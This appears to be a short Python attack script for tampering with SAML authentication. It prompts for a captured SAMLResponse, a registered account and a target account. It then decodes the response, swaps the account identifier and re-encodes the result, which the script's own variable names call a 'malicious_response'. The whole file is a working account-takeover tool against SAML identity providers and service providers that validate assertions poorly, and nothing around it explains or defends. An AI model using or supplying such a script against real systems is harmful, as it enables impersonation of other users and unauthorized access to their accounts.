import sys
import base64
import requests
import urllib

SAMLResponse = input("What is the SAMLResponse?")
print("\n")
registered_account = input("What is your registered account?")
print("\n")
target_account = input("What is your target account?")
print("\n")

parsed_response = urllib.parse.unquote(SAMLResponse)
parsed_response_bytes = parsed_response.encode('ascii')
base64_bytes = base64.b64decode(parsed_response_bytes)
base64_message = base64_bytes.decode('ascii')

malicious_response = base64_message.replace(registered_account,target_account)

base64_response = malicious_response.encode('ascii')
base64_bytes_response = base64.b64encode(base64_response)
response_bytes = base64_bytes_response.decode('ascii')
parsed_response = urllib.parse.quote(response_bytes, safe='/')

print("\n\n\nNew SAMLResponse = ", parsed_response)